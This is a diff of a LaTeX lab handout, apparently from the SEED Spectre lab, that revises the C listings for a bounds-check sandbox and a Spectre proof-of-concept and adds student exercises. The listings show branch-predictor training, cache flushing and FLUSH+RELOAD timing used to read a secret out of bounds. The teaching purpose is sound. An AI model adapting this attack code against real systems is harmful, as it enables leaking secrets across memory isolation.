@@ -78,7 +78,7 @@ Detailed coverage of the Spectre attack can be found in the following:
 \end{itemize}
 
 
-\paragraph{Lab Environment.} \seedenvironment
+\paragraph{Lab Environment.} \seedenvironmentAB
 
 When using this lab, instructors should keep the followings in mind:
 First, although the Spectre vulnerability
@@ -86,8 +86,8 @@ is a common design flaw inside Intel, AMD, and ARM CPUs, we have
 only tested the lab activities on Intel CPUs.
 Second, Intel is working on fixing this
 problem in its CPUs, so if a student's computer uses new Intel CPUs, the
-attack may not work. It is not a problem for now (February 2018),
-but six months from now, situations like this may arise.
+attack may not work. As of May 2021, it is not a problem for most students,
+but as time goes on, problems may arise. 
 
 
 \paragraph{Acknowledgment} This lab was developed with the help of 
@@ -364,23 +364,25 @@ Figure~\ref{spectre:fig:buffer} illustrates the setup for the experiment.
 In this setup, there are two regions: a restricted region and a non-restricted region. 
 The restriction is achieved via an if-condition implemented in a sandbox function
 described below. The sandbox function returns the value of \texttt{buffer[x]} for a \texttt{x} 
-value provided by users, only if \texttt{x} is less than the 
-size of the buffer; otherwise, nothing is returned. Therefore, this sandbox function 
+value provided by users, only if \texttt{x} is between the buffer's 
+lower and upper bounds. 
+Therefore, this sandbox function 
 will never return anything in the restricted area to users.
 
-
 \begin{lstlisting}
-unsigned int buffer_size = 10;
+unsigned int bound_lower = 0;
+unsigned int bound_upper = 9;
 uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
 
-uint8_t restrictedAccess(size_t x) 
+// Sandbox Function
+uint8_t restrictedAccess(size_t x)
 {
-  if (x < buffer_size) {   
+  if (x <= bound_upper && x >= bound_lower) {
      return buffer[x];
   } else {
      return 0;
   }
-} 
+}
 \end{lstlisting}
 
 
@@ -388,7 +390,7 @@ There is a secret value in the restricted area, the address of which
 is known to the attacker. However, the attacker cannot directly 
 access the memory holding the secret value; the only way to access the 
 secret is through the above sandbox function. From the previous task, we have learned that
-although the true-branch will never be executed if \texttt{x} is larger than the buffer size,
+although the true-branch will never be executed if \texttt{x} is out of bound, 
 at microarchitectural level, it can be executed and some traces can be left behind
 when the execution is reverted. 
 
@@ -401,54 +403,65 @@ when the execution is reverted.
 
 The code for the basic Spectre attack is shown below. In this code, there is a
 secret defined in Line \ding{192}. Assume that we cannot directly
-access the \texttt{secret} variable or the \texttt{buffer\_size} variable (we do assume that we
-can flush \texttt{buffer\_size} from the cache). Our goal is to print out the secret
+access the \texttt{secret}, \texttt{bound\_lower}, or 
+\texttt{bound\_upper} variables (we do assume that we
+can flush the two bound variables from the cache). 
+Our goal is to print out the secret
 using the Spectre attack. The code below only steals the first byte of the secret. Students can
 extend it to print out more bytes. 
 
 
 \begin{lstlisting}[caption=\texttt{SpectreAttack.c}, label=spectre:list:spectreattack]
-#define DELTA 1024
-
-unsigned int buffer_size = 10;
+unsigned int bound_lower = 0;
+unsigned int bound_upper = 9;
 uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
-uint8_t temp = 0;
-char *secret = "Some Secret Value";     (*@\ding{192}@*)
+char    *secret    = "Some Secret Value";     (*@\ding{192}@*)
 uint8_t array[256*4096];
 
-// Sandbox Function 
-uint8_t restrictedAccess(size_t x) 
+#define CACHE_HIT_THRESHOLD (80)
+#define DELTA 1024
+
+// Sandbox Function
+uint8_t restrictedAccess(size_t x)
 {
-  if (x < buffer_size) {         
-     return buffer[x];           
+  if (x <= bound_upper && x >= bound_lower) {
+     return buffer[x];
   } else {
      return 0;
   }
 }
 
-void spectreAttack(size_t larger_x) 
+void spectreAttack(size_t index_beyond)
 {
   int i;
   uint8_t s;
+  volatile int z;
 
   // Train the CPU to take the true branch inside restrictedAccess().
-  for (i = 0; i < 10; i++) { restrictedAccess(i); }
+  for (i = 0; i < 10; i++) {
+      _mm_clflush(&bound_upper);
+      _mm_clflush(&bound_lower);
+      restrictedAccess(i);
+  }
 
-  // Flush buffer_size and array[] from the cache.
-  _mm_clflush(&buffer_size);           
+  // Flush bound_upper, bound_lower, and array[] from the cache.
+  _mm_clflush(&bound_upper);
+  _mm_clflush(&bound_lower);
   for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
+  for (z = 0; z < 100; z++)  {   }
 
-  // Ask restrictedAccess() to return the secret in out-of-order execution.
-  s = restrictedAccess(larger_x);                      (*@\ding{193}@*)
-  array[s*4096 + DELTA] += 88;                         (*@\ding{194}@*)         
+  s = restrictedAccess(index_beyond);      (*@\ding{193}@*)
+  array[s*4096 + DELTA] += 88;             (*@\ding{194}@*)         
 }
 
-int main()
-{
-  flushSideChannel();   
-  size_t larger_x = (size_t)(secret - (char*)buffer);  (*@\ding{195}@*)
-  spectreAttack(larger_x);
-  reloadSideChannel(); 
+int main() {
+  flushSideChannel();
+  size_t index_beyond = (size_t)(secret - (char*)buffer);  (*@\ding{195}@*)
+  printf("secret: %p \n", secret);
+  printf("buffer: %p \n", buffer);
+  printf("index of secret (out of bound): %ld \n", index_beyond);
+  spectreAttack(index_beyond);
+  reloadSideChannel();
   return (0);
 }
 \end{lstlisting}
@@ -460,13 +473,16 @@ in Lines \ding{193}, \ding{194}, and \ding{195}. Line \ding{195}
 calculates the offset of the secret from the beginning of the buffer~(we assume that 
 the address of the secret is known to the attacker; in real attacks, there are many ways for 
 attackers to figure out the address, including guessing).
-The offset, which is definitely larger than 10, is fed into the \texttt{restrictedAccess()} 
-function. Because we have trained the CPU to take the true-branch inside
-\texttt{restrictedAccess()}, the CPU will return \texttt{buffer[larger\_x]}, which contains
+The offset is definitely beyond the scope of the buffer, so
+it is larger than the upper bound of the buffer or smaller than the 
+lower bound (i.e., a negative number). The offset
+is fed into the \texttt{restrictedAccess()} function.
+Because we have trained the CPU to take the true-branch inside
+\texttt{restrictedAccess()}, the CPU will return \texttt{buffer[index\_beyond]}, which contains
 the value of the secret, in the out-of-order execution. 
 The secret value then causes its corresponding element in \texttt{array[]} to
 be loaded into cache. All these steps will eventually be reverted, so 
-from outside, only zero is returned from \texttt{restrictedAccess()}, not the value of the secret.
+from the outside, only zero is returned from \texttt{restrictedAccess()}, not the value of the secret.
 However, the cache is not cleaned, and \texttt{array[s*4096 + DELTA]} is still kept in
 the cache. Now, we just need to use the side-channel technique to figure out which element of the
 \texttt{array[]} is in the cache.  
@@ -513,76 +529,72 @@ code is shown in the following.
 %selected the CPU does not load the extra values into the cache reducing the noise. 
 
 
-\begin{lstlisting}[caption=SpectreAttackImproved.c]
+\begin{lstlisting}[caption=\texttt{SpectreAttackImproved.c}]
 static int scores[256];
 
 void reloadSideChannelImproved()
 {
-  int i;
-  volatile uint8_t *addr;
-  register uint64_t time1, time2;
-  int junk = 0;
+  ......
   for (i = 0; i < 256; i++) {
-     addr = &array[i * 4096 + DELTA];
-     time1 = __rdtscp(&junk);
-     junk = *addr;
-     time2 = __rdtscp(&junk) - time1;
+     ......
      if (time2 <= CACHE_HIT_THRESHOLD)
         scores[i]++; /* if cache hit, add 1 for this value */
   }
 }
 
-void spectreAttack(size_t larger_x) 
+void spectreAttack(size_t index_beyond)
 {
-  int i;
-  uint8_t s;
-
-  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
-
-  // Train the CPU to take the true branch inside victim().
-  for (i = 0; i < 10; i++) {      
-     _mm_clflush(&buffer_size);                  
-     restrictedAccess(i);                        
-  }
-
-  // Flush buffer_size and array[] from the cache.
-  _mm_clflush(&buffer_size);           
-  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
-
-  // Ask victim() to return the secret in out-of-order execution.
-  s = restrictedAccess(larger_x);         
-  array[s*4096 + DELTA] += 88;                  
+  ... omitted: same as that in SpectreAttack.c ...
 }
 
-
-int main()
-{
+int main() {
   int i;
   uint8_t s;
-  size_t larger_x = (size_t)(secret-(char*)buffer);
-  flushSideChannel();   
+  size_t  index_beyond = (size_t)(secret-(char*)buffer);
 
-  for (i = 0; i < 256;  i++) scores[i] = 0;
+  flushSideChannel();
+  for(i=0;i<256; i++) scores[i]=0;
+
   for (i = 0; i < 1000; i++) {
-      spectreAttack(larger_x);
-      reloadSideChannelImproved();
+    printf("*****\n");                 (*@\ding{192}@*)
+    spectreAttack(index_beyond);
+    usleep(10);                        (*@\ding{193}@*)
+    reloadSideChannelImproved();
   }
 
-  int max = 0;
+  int max = 0;                     
   for (i = 0; i < 256; i++){
-     if(scores[max] < scores[i])  max = i;
+   if(scores[max] < scores[i])
+     max = i;
   }
- 
-  printf("Reading secret value at %p = ", (void*)larger_x);
-  printf("The  secret value is %d\n", max);
+
+  printf("Reading secret value at index %ld\n", index_beyond);
+  printf("The  secret value is %d(%c)\n", max, max);
   printf("The number of hits is %d\n", scores[max]);
   return (0);
 }
 \end{lstlisting}
 
-You may observe that when running the code above, the one with the highest score is always
-\texttt{scores[0]}. Please figure out the reason, and fix the code above,
-so the actual secret value (which is not zero) will be printed out. 
+\paragraph{Your tasks.} Please compile and run \texttt{SpectreAttackImproved.c},
+and do the following tasks:
+
+\begin{itemize}
+  \item You may observe that when running the code above, 
+        the one with the highest score is very likely to be 
+        \texttt{scores[0]}. Please figure out why, and fix the code above,
+        so the actual secret value (which is not zero) will be printed out. 
+	
+  \item Line~\ding{192} seems useless, but from our experience on SEED Ubuntu 20.04, without this line,
+        the attack will not work. On the SEED Ubuntu 16.04 VM, there is no need for this line. 
+	We have not figured out the exact reason yet, so if you can, your instructor will
+	likely give you bonus points. 
+	Please run the program with and without this line, and describe your observations. 
+
+  \item Line~\ding{193} causes the program to sleep for 10 microseconds. How long the program
+        sleeps does affect the success rate of the attack. Please try several other values,
+	and describe your observations. 
+\end{itemize}
+ 
 
 
 
